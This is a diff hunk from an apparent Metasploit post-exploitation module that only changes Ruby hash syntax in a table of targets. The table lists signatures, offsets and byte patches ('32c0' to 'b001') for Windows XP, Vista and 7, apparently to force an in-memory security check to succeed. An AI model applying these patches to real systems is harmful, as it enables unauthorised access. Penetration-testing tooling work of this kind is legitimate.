@@ -50,13 +50,13 @@ class Metasploit3 < Msf::Post
     revert = datastore['REVERT']
 
     targets = [
-      { :sig => "8bff558bec83ec50a1", :sigoffset => 0x9927, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x99cc, :os => /Windows XP.*Service Pack 2/ },
-      { :sig => "8bff558bec83ec50a1", :sigoffset => 0x981b, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x98c0, :os => /Windows XP.*Service Pack 3/ },
-      { :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xb76a, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xb827, :os => /Windows Vista/ },
-      { :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xb391, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xb44e, :os => /Windows Vista/ },
-      { :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xacf6, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xadb3, :os => /Windows Vista/ },
-      { :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xe881, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xe93e, :os => /Windows 7/ },
-      { :sig => "8bff558bec83ec50a1",       :sigoffset => 0x97d3, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x9878, :os => /Windows XP.*Service Pack 3 - spanish/ }
+      { sig: "8bff558bec83ec50a1", sigoffset: 0x9927, orig_code: "32c0", patch: "b001", patchoffset: 0x99cc, os: /Windows XP.*Service Pack 2/ },
+      { sig: "8bff558bec83ec50a1", sigoffset: 0x981b, orig_code: "32c0", patch: "b001", patchoffset: 0x98c0, os: /Windows XP.*Service Pack 3/ },
+      { sig: "8bff558bec81ec88000000a1", sigoffset: 0xb76a, orig_code: "32c0", patch: "b001", patchoffset: 0xb827, os: /Windows Vista/ },
+      { sig: "8bff558bec81ec88000000a1", sigoffset: 0xb391, orig_code: "32c0", patch: "b001", patchoffset: 0xb44e, os: /Windows Vista/ },
+      { sig: "8bff558bec81ec88000000a1", sigoffset: 0xacf6, orig_code: "32c0", patch: "b001", patchoffset: 0xadb3, os: /Windows Vista/ },
+      { sig: "8bff558bec81ec88000000a1", sigoffset: 0xe881, orig_code: "32c0", patch: "b001", patchoffset: 0xe93e, os: /Windows 7/ },
+      { sig: "8bff558bec83ec50a1",       sigoffset: 0x97d3, orig_code: "32c0", patch: "b001", patchoffset: 0x9878, os: /Windows XP.*Service Pack 3 - spanish/ }
     ]
 
     unsupported if client.platform !~ /win32|win64/i
